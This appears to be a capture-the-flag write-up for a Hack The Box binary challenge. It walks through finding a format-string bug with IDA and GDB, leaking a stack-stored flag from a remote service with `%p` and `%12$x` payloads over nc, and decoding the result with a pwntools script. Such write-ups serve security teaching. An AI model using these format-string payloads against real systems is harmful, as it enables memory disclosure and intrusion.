Before starting the vulnerability search, we must first perform a basic analysis.

If we look at the strings of the executable and filter by the word 'flag' we realize that there is a file called flag.txt which we assume is hidden.

We are going to debug the executable with the IDA tool.

Inside the `car_menu` function we have a file called `flag.txt` which will only be opened if the program flow enters `car_menu:loc_FC`. We know this because at that function a call is made to the `_printf` function after 'winning the race'.

Let's see what address the `_printf` function has:

Before we continue we are going to create a file called 'flag.txt' as the one the program is looking for to read in the same directory where we are going to run the binary.

``` 
echo 'AAAA' > flag.txt
```

We run the binary in GDB and put a breakpoint in the vulnerable function `_printf`:

Now we run the binary and enter 40x `%p` to display more information: 

```
gdb-peda$ run
Name: sth
Nickname: sth
> 2
> 1
> 2
> %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
```

At the 12th position, there is a beginning of `flag.txt` â€” `AAAA` string which was input before. It seems like the flag is stored on the stack.

Now we have to leak the flag from the remote service. We use [direct parameter access input format string](https://kevinalmansa.github.io/application%20security/Format-Strings/) `%12$x` to leak `flag.txt` from a remote system.

```
nc 104.248.169.123 31242
[ ... ]
> %12$x
```

If we convert them to ASCII we will find the beginning of the flag:

```
7b425448 -> {BTH
4854427b -> HTB{
```

The next step is reversing the flag. As we know that the flag is between two '{}' we will look for the value of the closing brace in hexadecimal.

```
{ -> 7b
} -> 7d
```

Now that we know its value we will reverse the bytes that are inside the braces.

```
%x%x%x%x%x%x%x%x%x%x%x---FLAG: %p%p%p%p%p%p%p%p%p%p%p ---
```

The last thing left is to create a script to view the flag in ASCII:

```python
from pwn import *

flag = '0x7b4254480x5f7968770x5f6431640x34735f310x745f33760x665f33680x5f67346c0x745f6e300x355f33680x6b6334740x7d213f'
decoded_flag = []

for element in flag.split('0x')[1:]:
 decoded_flag.append(p32(int('0x' + element,16)))
 
print (b''.join(decoded_flag))
```
